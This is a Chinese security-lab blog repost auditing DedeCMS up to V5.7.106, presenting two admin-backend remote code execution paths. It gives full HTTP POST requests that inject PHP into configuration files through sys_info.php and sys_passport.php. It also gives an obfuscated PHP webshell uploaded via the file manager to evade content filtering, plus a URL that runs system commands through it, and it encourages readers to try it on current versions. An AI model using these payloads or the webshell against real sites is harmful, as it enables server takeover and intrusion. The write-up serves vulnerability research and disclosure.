#  Dedecms最新版审计-0dayRCE

Ggoodstudy  [ 星海安全实验室 ](javascript:void\(0\);)

**星海安全实验室** ![]()

微信号 gh_a17ef3516ba5

功能介绍 专注于红蓝对抗、网络安全研究、漏洞预警。

____

___发表于_

收录于合集

文章来源于 火线zone，发的时间有点儿晚了，不过目前最新版的RCE应该没有问题，有兴趣的可以试试，没精力复现了。

简介  

DEDECMS
是一种可以综合管理网站上各种栏目的通用工具，新闻、产品、文档、下载、音乐、教学视频……，通过模版技术，他们都在同一套系统里完成更新和维护。DedeCMS
是目前国内最强大、最稳定的中小型门户网站建设解决方案之一，基于 PHP + MySQL 的技术开发，全部源码开放。

#### 影响版本

> ?<=DedeCMS V5.7.106

#### 环境搭建

官网下载最新版本即可

> https://www.dedecms.com/

![](https://gitee.com/fuli009/images/raw/master/public/20230616222200.png)

源码下载后直接解压phpstudy`www`目录下直接安装。

![](https://gitee.com/fuli009/images/raw/master/public/20230616222201.png)

配置数据库

![](https://gitee.com/fuli009/images/raw/master/public/20230616222203.png)

无需导入数据，直接安装。

![](https://gitee.com/fuli009/images/raw/master/public/20230616222204.png)

#### RCE+分析

##### RCE1

比较有意思的这里的RCE不是直接由命令执行函数`system`、`exec`等造成的，这些函数在这个项目中是检索不到的，

![](https://gitee.com/fuli009/images/raw/master/public/20230616222205.png)

  

这些函数在配置文件中被定义进了disable_function。

这里的RCE是由函数`fwrite`触发的，搜索一下危险函数`fwrite`

![](https://gitee.com/fuli009/images/raw/master/public/20230616222206.png)

以`sys_info.php`为例

![](https://gitee.com/fuli009/images/raw/master/public/20230616222207.png)

根据字符串直接写入配置文件

![](https://gitee.com/fuli009/images/raw/master/public/20230616222209.png)

基本上字段有160个字段，在这里修改配置文件

![](https://gitee.com/fuli009/images/raw/master/public/20230616222210.png)

访问配置文件，路径为

![](https://gitee.com/fuli009/images/raw/master/public/20230616222211.png)

> http://dedecms.org:8016/uploads/data/config.cache.inc.php

![](https://gitee.com/fuli009/images/raw/master/public/20230616222212.png)

完美执行代码，修改配置，所有关于字段的字符串都可修改，构造payload

    
    
    POST /uploads/dede/sys_info.php HTTP/1.1  
    Host: dedecms.org:8016  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 5277  
    Origin: http://dedecms.org:8016  
    Connection: close  
    Referer: http://dedecms.org:8016/uploads/dede/sys_info.php  
    Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=2m5nqo8dsir04s541ab9c3f9i4; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=27d26bbe70ce4635; DedeLoginTime=1678950737; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=4a8556e201285aac; _csrf_name_5f9f6663=e8240231360cdb3477e421ac5afe613b; _csrf_name_5f9f66631BH21ANI1AGD297L1FF21LN02BGE1DNG=a77e938eaf09a438; ENV_GOBACK_URL=%2Fuploads%2Fdede%2Flog_list.php  
    Upgrade-Insecure-Requests: 1  
      
    token=07a4d8c45bcf4414f549842405213999&dopost=save&edit___cfg_basehost=http%3A%2F%2Fdedecms.org%3A8016&edit___cfg_indexurl=%2Fuploads&edit___cfg_indexname=%E4%B8%BB%E9%A1%B5&edit___cfg_webname=%E6%88%91%E7%9A%84%E7%BD%91%E7%AB%99%5C&edit___cfg_arcdir=%2Fa&edit___cfg_medias_dir=%2Fuploads&edit___cfg_fck_xhtml=N&edit___cfg_df_style=1&edit___cfg_powerby=1%5C&edit___cfg_keywords=%3Bphpinfo%28%29%3B%2F*&edit___cfg_description=zzz&edit___cfg_beian=%3C%3Fphp+%24a+%3D+%24GLOBALS%5B%22_GET%22%5D%3B+%24b+%3D+%24GLOBALS%5B%22_GET%22%5D%3B+%24a%5B%27test1%27%5D%28%24b%5B%27test2%27%5D%29%3F%3E&edit___cfg_cmspath=%2Fuploads&edit___cfg_cookie_encode=AUyWXtwtdmYTcvH4tIlQrgKlh3rhGO&edit___cfg_backup_dir=backupdata&edit___cfg_adminemail=admin%40dedecms.com&edit___cfg_html_editor=wangEditor&edit___cfg_domain_cookie=&edit___cfg_specnote=6&edit___cfg_list_symbol=+%3E+&edit___cfg_keyword_replace=Y&edit___cfg_multi_site=N&edit___cfg_dede_log=N&edit___cfg_ftp_host=&edit___cfg_ftp_port=21&edit___cfg_ftp_user=&edit___cfg_ftp_pwd=&edit___cfg_ftp_root=%2F&edit___cfg_ftp_mkdir=N&edit___cfg_cli_time=8&edit___cfg_sendmail_bysmtp=Y&edit___cfg_smtp_server=smtp.qq.com&edit___cfg_smtp_port=25&edit___cfg_smtp_usermail=desdev%40vip.qq.com&edit___cfg_smtp_user=desdev&edit___cfg_smtp_password=desdev&edit___cfg_online_type=nps&edit___cfg_upload_switch=Y&edit___cfg_allsearch_limit=1&edit___cfg_rewrite=N&edit___cfg_delete=Y&edit___cfg_typedir_df=Y&edit___cfg_remote_site=N&edit___cfg_title_site=N&edit___cfg_mysql_type=mysql&edit___cfg_timeout_exit=1800&edit___cfg_archives_log=N&edit___cfg_fail_limit=5&edit___cfg_lock_time=3600&edit___cfg_ddimg_width=240&edit___cfg_ddimg_height=180&edit___cfg_imgtype=jpg%7Cgif%7Cpng&edit___cfg_softtype=zip%7Cgz%7Crar%7Ciso%7Cdoc%7Cxsl%7Cppt%7Cwps&edit___cfg_mediatype=swf%7Cmpg%7Cmp3%7Cmp4%7Crm%7Crmvb%7Cwmv%7Cwma%7Cwav%7Cmid%7Cmov&edit___cfg_album_width=800&edit___cfg_album_row=3&edit___cfg_album_col=4&edit___cfg_album_pagesize=12&edit___cfg_album_style=2&edit___cfg_album_ddwidth=200&edit___cfg_max_face=50&edit___cfg_addon_savetype=ymd&edit___cfg_qk_uploadlit=Y&edit___cfg_ddimg_full=N&edit___cfg_ddimg_bgcolor=0&edit___cfg_uplitpic_cut=Y&edit___cfg_album_mark=N&edit___cfg_mb_open=N&edit___cfg_mb_album=Y&edit___cfg_mb_upload=Y&edit___cfg_mb_upload_size=1024&edit___cfg_mb_sendall=Y&edit___cfg_mb_rmdown=Y&edit___cfg_mb_addontype=swf%7Cmpg%7Cmp3%7Cmp4%7Crm%7Crmvb%7Cwmv%7Cwma%7Cwav%7Cmid%7Cmov%7Czip%7Crar%7Cdoc%7Cxsl%7Cppt%7Cwps&edit___cfg_mb_max=500&edit___cfg_mb_notallow=www%2Cbbs%2Cftp%2Cmail%2Cuser%2Cusers%2Cadmin%2Cadministrator&edit___cfg_mb_idmin=3&edit___cfg_mb_pwdmin=3&edit___cfg_mb_pwdtype=32&edit___cfg_md_idurl=N&edit___cfg_mb_rank=10&edit___cfg_md_mailtest=N&edit___cfg_mb_spacesta=-10&edit___cfg_mb_allowncarc=Y&edit___cfg_mb_allowreg=Y&edit___cfg_mb_adminlock=N&edit___cfg_mb_spaceallarc=0&edit___cfg_mb_wnameone=N&edit___cfg_mb_feedcheck=N&edit___cfg_mb_msgischeck=N&edit___cfg_mb_reginfo=Y&edit___cfg_notallowstr=%E9%9D%9E%E5%85%B8%7C%E8%89%BE%E6%BB%8B%E7%97%85%7C%E9%98%B3%E7%97%BF&edit___cfg_replacestr=%E5%A5%B9%E5%A6%88%7C%E5%AE%83%E5%A6%88%7C%E4%BB%96%E5%A6%88%7C%E4%BD%A0%E5%A6%88%7C%E5%8E%BB%E6%AD%BB%7C%E8%B4%B1%E4%BA%BA&edit___cfg_feedbackcheck=N&edit___cfg_feedback_ck=Y&edit___cfg_feedback_time=30&edit___cfg_feedback_numip=30&edit___cfg_vdcode_member=Y&edit___cfg_mb_cktitle=Y&edit___cfg_mb_editday=7&edit___cfg_caicai_sub=2&edit___cfg_caicai_add=2&edit___cfg_feedback_add=5&edit___cfg_feedback_sub=5&edit___cfg_feedback_forbid=N&edit___cfg_sendarc_scores=10&edit___cfg_sendfb_scores=3&edit___cfg_face_adds=10&edit___cfg_moreinfo_adds=20&edit___cfg_money_scores=50&edit___cfg_login_adds=2&edit___cfg_userad_adds=10&edit___cfg_feedback_guest=N&edit___cfg_arcsptitle=N&edit___cfg_arcautosp=N&edit___cfg_arcautosp_size=5&edit___cfg_list_son=Y&edit___cfg_keyword_like=N&edit___cfg_index_max=10000&edit___cfg_index_cache=86400&edit___cfg_tplcache=Y&edit___cfg_tplcache_dir=%2Fdata%2Ftplcache&edit___cfg_makesign_cache=N&edit___cfg_search_max=50000&edit___cfg_search_maxrc=300&edit___cfg_search_time=3&edit___cfg_need_typeid2=Y&edit___cfg_cache_type=id&edit___cfg_makeindex=N&edit___cfg_make_andcat=N&edit___cfg_make_prenext=Y&edit___cfg_puccache_time=36000&edit___cfg_memcache_enable=N&edit___cfg_memcache_mc_defa=memcache%3A%2F%2F127.0.0.1%3A11211%2Fdefault127&edit___cfg_memcache_mc_oth=&edit___cfg_digg_update=0&edit___cfg_disable_funs=phpinfo%2Ceval%2Cassert%2Cexec%2Cpassthru%2Cshell_exec%2Csystem%2Cproc_open%2Cpopen%2Ccurl_exec%2Ccurl_multi_exec%2Cparse_ini_file%2Cshow_source%2Cfile_put_contents%2Cfsockopen%2Cfopen%2Cfwrite%2Cpreg_replace&edit___cfg_disable_tags=php&edit___cfg_auot_description=240&edit___cfg_rm_remote=Y&edit___cfg_arc_dellink=N&edit___cfg_arc_autopic=Y&edit___cfg_arc_autokeyword=Y&edit___cfg_title_maxlen=60&edit___cfg_check_title=Y&edit___cfg_jump_once=Y&edit___cfg_task_pwd=&edit___cfg_addon_domainbind=N&edit___cfg_addon_domain=&edit___cfg_df_dutyadmin=admin&edit___cfg_arc_dirname=Y&edit___cfg_arc_click=-1&edit___cfg_replace_num=2&edit___cfg_replace_total=0&edit___cfg_replace_sort=1&edit___cfg_sphinx_article=N&edit___cfg_sphinx_host=localhost&edit___cfg_sphinx_port=9312&edit___cfg_cross_sectypeid=N&edit___cfg_baidunews_limit=100&edit___cfg_updateperi=15&imageField.x=42&imageField.y=8

![](https://gitee.com/fuli009/images/raw/master/public/20230616222213.png)

回头看配置文件

![](https://gitee.com/fuli009/images/raw/master/public/20230616222214.png)

数据库中并未写入

![](https://gitee.com/fuli009/images/raw/master/public/20230616222215.png)

比较有意思的基本上上所有的配置文件在做修改的时候都被转义了，导致无法RCE。既fwrite直接写入配置文件

![](https://gitee.com/fuli009/images/raw/master/public/20230616222216.png)

继续从配置文件向上查找，在路径

> dede/sys_passport.php

构造payload

    
    
    POST /uploads/dede/sys_passport.php HTTP/1.1  
    Host: dedecms.org:8016  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 172  
    Origin: http://dedecms.org:8016  
    Connection: close  
    Referer: http://dedecms.org:8016/uploads/dede/sys_passport.php?1678952050  
    Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=2m5nqo8dsir04s541ab9c3f9i4; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=27d26bbe70ce4635; DedeLoginTime=1678950737; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=4a8556e201285aac; _csrf_name_5f9f6663=e8240231360cdb3477e421ac5afe613b; _csrf_name_5f9f66631BH21ANI1AGD297L1FF21LN02BGE1DNG=a77e938eaf09a438; ENV_GOBACK_URL=%2Fuploads%2Fdede%2Flog_list.php  
    Upgrade-Insecure-Requests: 1  
      
    dopost=save&edit___cfg_pp_need=Y&edit___cfg_pp_encode=TgTSa7141E&edit___cfg_pp_login=s&edit___cfg_pp_exit=s\&edit___cfg_pp_reg=';phpinfo();/*&imageField.x=39&imageField.y=9

![](https://gitee.com/fuli009/images/raw/master/public/20230616222217.png)

查看配置文件`config_passport.php`

![](https://gitee.com/fuli009/images/raw/master/public/20230616222218.png)

这里因为文件包含的文件为`config.php`,向上查找，配置文件路径为

> include/config_passport.php

请求

> http://dedecms.org:8016/uploads/include/config_passport.php

![](https://gitee.com/fuli009/images/raw/master/public/20230616222219.png)

配置文件内容

![](https://gitee.com/fuli009/images/raw/master/public/20230616222220.png)

比较有意思的是这里没有做转义，依旧可以实现RCE

##### RCE2

文件上传

> /dede/file_manage_view.php?fmdo=newfile&activepath=/uploads/uploads

![](https://gitee.com/fuli009/images/raw/master/public/20230616222221.png)

这里可以直接上传php文件，并没有做限制

![](https://gitee.com/fuli009/images/raw/master/public/20230616222222.png)

但是后台有校验文件内容

![](https://gitee.com/fuli009/images/raw/master/public/20230616222223.png)

一句话直接被拦，回头看代码

![](https://gitee.com/fuli009/images/raw/master/public/20230616222224.png)

这里是有`disable_function`以及正则的，所以所有的文件上传就是围绕如何`绕过`

    
    
    <?php  
    $a = $GLOBALS["_GET"];  
    $b = $GLOBALS["_GET"];  
    $a['test1']($b['test2'])  
    ?>

这里只要是绕过正则，都可以，免杀的一句话都没问题。

> http://dedecms.org:8016/uploads/shell.php

![](https://gitee.com/fuli009/images/raw/master/public/20230616222225.png)

当然，这里使用`assert`执行跟php版本有关

>
> http://dedecms.org:8016/uploads/shell.php?test1=assert&&test2=system(%22ipconfig%22);

![](https://gitee.com/fuli009/images/raw/master/public/20230616222226.png)

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

